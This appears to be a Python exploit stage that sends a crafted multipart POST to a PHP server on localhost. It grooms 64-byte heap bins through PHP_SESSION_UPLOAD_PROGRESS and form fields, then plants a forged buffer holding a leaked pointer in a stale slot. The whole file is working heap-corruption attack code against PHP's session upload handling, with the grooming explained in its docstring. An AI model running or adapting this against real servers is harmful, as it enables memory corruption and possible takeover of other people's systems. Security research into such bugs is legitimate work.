#!/usr/bin/env python3
"""B: two 39-byte value fields first (live 64B strings occupy slot0/1 of the
first 64B bin page), then PHPSESSID/progress, then a forge field whose 63-byte
value raw buffer (64B) takes slot2 = stale id 0x...6e080.
usage: b_forge64_pre.py LEAK [MARK]
"""
import socket,sys,struct
LEAK=int(sys.argv[1],0); MARK=sys.argv[2] if len(sys.argv)>2 else 'M'
BND=b'B'*10
parts=[{'n':'p0','d':b'q'*39},
       {'n':'PHPSESSID','d':b'attacksessionid0001'},{'n':'PHP_SESSION_UPLOAD_PROGRESS','d':b'pwn'}]
v=bytearray(b'A'*63); struct.pack_into('<Q',v,0x10,LEAK); v[0x18:0x18+len(MARK)]=MARK.encode()
parts.append({'n':'forge','d':bytes(v)})
o=bytearray()
for p in parts:
    o+=b'--'+BND+b'\r\nContent-Disposition: form-data; name="'+p['n'].encode()+b'"\r\n\r\n'+p['d']+b'\r\n'
o+=b'--'+BND+b'--\r\n'
h=(f'POST /index.php HTTP/1.1\r\nHost: 127.0.0.1:8088\r\nContent-Type: multipart/form-data; boundary={BND.decode()}\r\nContent-Length: {len(o)}\r\nConnection: close\r\n\r\n').encode()
s=socket.create_connection(('127.0.0.1',8088),timeout=20); s.settimeout(20)
data=b''
try:
    s.sendall(h+bytes(o))
    while len(data)<200000:
        c=s.recv(65536)
        if not c: break
        data+=c
except OSError as e: print('recv_err',repr(e))
s.close()
head,_,rest=data.partition(b'\r\n\r\n')
for line in head.split(b'\r\n'):
    if line.lower().startswith(b'set-cookie'):
        print('SETCOOKIE_LEN',len(line)); print('VALUE',line[:120].decode('latin1','replace'))
print('BODY',rest[:100].decode('latin1','replace'))
open('/tmp/b_forge64_pre1.resp','wb').write(data)
